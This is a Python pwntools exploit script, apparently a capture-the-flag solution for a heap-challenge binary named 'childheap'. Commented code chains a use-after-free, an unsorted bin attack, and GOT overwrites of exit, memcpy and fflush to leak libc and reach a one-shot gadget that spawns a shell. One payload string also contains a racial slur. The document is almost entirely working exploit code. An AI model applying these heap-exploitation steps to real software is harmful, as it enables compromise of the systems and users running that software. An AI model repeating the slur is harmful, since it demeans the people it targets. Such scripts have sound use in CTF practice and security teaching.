from pwn import *

puts       = 0x400736
allocs     = 0x6020B8
exit_got   = 0x602078
memcpy_got = 0x602050
memcpy     = 0x400796
set_age    = 0x400BD8

def alloc(size, data):
	r.sendlineafter('> ', '1')
	r.sendlineafter('size: ', str(size))
	r.sendafter('data: ', data)

def secret(code):
	r.sendlineafter('> ', str(0x31337))
	r.sendlineafter('code: ', str(code))
	
def modify_name(name):
	r.sendlineafter('> ', '3')
	r.sendlineafter('? ', 'n')
	if len(name) < 0x16:
		name += '\n'
	r.sendafter('name: ', name)
	r.sendlineafter('? ', 'y')

def modify_age(age):
	r.sendlineafter('> ', '3')
	r.sendlineafter('? ', 'y')
	r.sendlineafter('age: ', str(age))
	r.sendlineafter('name: ', 'kek')
	r.sendlineafter('? ', 'n')

def free():
	r.sendlineafter('> ', '2')

def leak():
	r.sendlineafter('> ', '3')
	r.sendlineafter('? ', 'n')
	r.sendlineafter('name: ', 'lel')
	r.sendlineafter('? ', 'y')
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	# set up a fake unsorted chunk for later use
	secret(0x1011)

	alloc(0xfff, p64(0xb00bface))

	free()
	# fgets allocates a 0x1010 chunk when it first gets called
	modify_name('kek')
	# free the fgets buffer
	free()
	# fgets doesn't realize the buffer is free'd and we can do unsorted bin attack
	# on the bss pointer which contains the user info
	modify_name(p64(0xb00bface) + p64(0x6020C0 - 0x10))
	
	# unsorted bin attack
	alloc(0xfff, p64(0xb00bface))
	# at this pointer, 0x6020C0 points to the unsorted bin in main arena
	# we overwrite its FD/BK with our fake heap chunk in the bss in order to get it back
	# when we allocate a 0x1010 chunk
	modify_name(p64(0x6020a8)*3)
 
	free()
	
	# now we will get back the bss pointer at 0x6020b8
	# we place the global allocation counter where the name
	# pointer originally was in order to call modify on it
	# and overwrite with 0 to gain one more allocation
	alloc(0xfff, p64(0xdeadbeef) + p64(allocs-9))

	# overwrite with 0 to gain one more allocation
	modify_name(p64(0) + p64(0x6020c0 -0x10))
	modify_name(p64(0) + p64(exit_got-8))
	# when entering an age, we're limited to 0x64 *max*
	# however, we can bypass if we overwrite it exit's GOT entry
	# with the .text address that sets the age at *0x6020c0 if
	# the provided was legit. that way we can easily overwrite GOT entries
	modify_name(p64(set_age) + p64(0x6020c0-0x10))

	# unsorted bin attack round 2
	alloc(0xfff, 'niggatron')
	# same as before
	modify_name(p64(0x6020a8)*3)

	free()

	# this time we will call modify on memcpy's GOT entry
	# and overwrite with puts in order to leak libc
	# since memcpy's 1st argument is a pointer
	alloc(0xfff, p64(memcpy_got)*2)

	# overwrite memcpy with puts
	modify_age(puts)

	# memcpy(memcpy_got + 8) => puts(malloc_got)
	libc = leak() - 0x84130
	oneshot = libc + 0xf1147
	log.success('Libc: 0x{:x}'.format(libc))

	# patch memcpy back
	modify_age(memcpy)
	# overwrite fflush with one shot gadget
	modify_name(p64(oneshot)*3)

	# trigger fflush(stdin) in modify()
	r.sendlineafter('> ', '3')
	r.sendlineafter('? ', 'n')
	r.sendlineafter('name: ', 'lel')
	
	r.interactive()

if __name__ == "__main__":
	r = process('./childheap')
	pause()
	pwn()
